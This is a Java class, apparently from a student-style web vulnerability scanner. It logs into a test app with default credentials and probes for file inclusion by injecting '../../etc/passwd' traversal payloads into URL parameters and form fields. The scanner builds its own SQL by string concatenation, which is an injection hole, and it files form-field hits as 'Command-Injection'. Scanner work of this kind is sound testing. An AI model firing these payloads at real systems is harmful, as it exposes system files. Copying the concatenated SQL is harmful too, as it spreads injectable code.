import java.sql.Connection;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.List;
import org.openqa.selenium.By;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.sqlite.SQLiteDataSource;

public class LFIRFI {
	public void getFileInclusion(String URL, String str, byte[] scanID, Long scanDate) {
		System.setProperty("webdriver.chrome.driver", "C:\\Users\\ALI\\Desktop\\selenium\\chrome\\chromedriver.exe");
		ChromeDriver driver = new ChromeDriver();
		driver.get(URL);
		driver.findElement(By.xpath("//*[@name='username']")).sendKeys("admin");
		driver.findElement(By.xpath("//*[@name='password']")).sendKeys("password");
		driver.findElement(By.xpath("//*[@name='Login']")).click();
		driver.get(str);
		try {
			String currentURL = driver.getCurrentUrl();
			String param = currentURL.split("\\?")[1].split("\\=")[0];
			System.out.println(param);
			String urlString =currentURL.split("\\=")[0]+"=../../../../../../../../../../../etc/passwd";
			System.out.println(urlString);
			driver.get(urlString);
			try {
				if(driver.getPageSource().contains("root:x:0:0")) {
					System.out.println(param);
					SQLiteDataSource ds = null;
	
			        try {
			            ds = new SQLiteDataSource();
			            ds.setUrl("jdbc:sqlite:test.db");
			        } catch ( Exception e ) {
			            e.printStackTrace();
			            System.exit(0);
			        }
			        
			        String queryInsertURL = "INSERT INTO vulnList ( baseURL, fullURL, parameter, vulnerability, scanID, scanDate ) VALUES ( '"+URL+"','"+str+"','"+param+"','Local-Remote File Inclusion','"+scanID+"','"+scanDate+"')";
		        	try ( Connection conn = ds.getConnection();
		        		    Statement stmt = conn.createStatement(); ) {
		        		    stmt.executeUpdate( queryInsertURL );
		        		    conn.close();
	
		        		} catch ( SQLException e ) {
		        		    e.printStackTrace();
		        		    System.exit( 0 );
		        		}
			        
				}
			}catch ( Exception e ) {}
		}catch ( Exception e ) {}
		
		List<WebElement> inputElements = driver.findElements(By.cssSelector("input"));
		for (WebElement Element : inputElements) {
			try {
					String attrName = Element.getAttribute("name");
					if(!driver.getPageSource().contains("password_new") && !driver.getPageSource().contains("password_conf")){
						driver.findElement(By.xpath("//*[@name='"+attrName+"']")).sendKeys("../../../../../../../../../../../etc/passwd");
						driver.findElement(By.xpath("//*[@name='Submit']")).click();
					
					}
					if(driver.getPageSource().contains("root:x:0:0")) {
						System.out.println(attrName);
						SQLiteDataSource ds = null;

				        try {
				            ds = new SQLiteDataSource();
				            ds.setUrl("jdbc:sqlite:test.db");
				        } catch ( Exception e ) {
				            e.printStackTrace();
				            System.exit(0);
				        }
				        
				        String queryInsertURL = "INSERT INTO vulnList ( baseURL, fullURL, parameter, vulnerability, scanID, scanDate ) VALUES ( '"+URL+"','"+str+"','"+attrName+"','Command-Injection','"+scanID+"','"+scanDate+"')";
			        	try ( Connection conn = ds.getConnection();
			        		    Statement stmt = conn.createStatement(); ) {
			        		    stmt.executeUpdate( queryInsertURL );
			        		    conn.close();

			        		} catch ( SQLException e ) {
			        		    e.printStackTrace();
			        		    System.exit( 0 );
			        		}
				        
					}
				
			}catch(Exception e) {}
				
		}
		
		driver.quit();
	}
}
